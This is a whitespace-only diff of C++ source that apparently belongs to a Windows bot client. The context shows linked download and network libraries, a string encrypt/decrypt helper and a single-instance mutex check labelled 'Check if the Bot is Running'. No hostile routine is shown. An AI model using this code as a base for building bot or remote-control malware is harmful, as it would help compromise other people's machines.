@@ -18,10 +18,15 @@
 #include <comutil.h>
 #include "Helpers.hpp"
 #include "OsHelpers.hpp"
+
 #pragma comment(lib,"comsuppw.lib")
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib,"wbemuuid")
+
+
+
+
 
 std::string encryptDecrypt(std::string toEncrypt) {
 	Config config;
@@ -40,8 +45,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 #endif
 		Config config;
 	
-
-
 		//Check if the Bot is Running
 		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
 		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
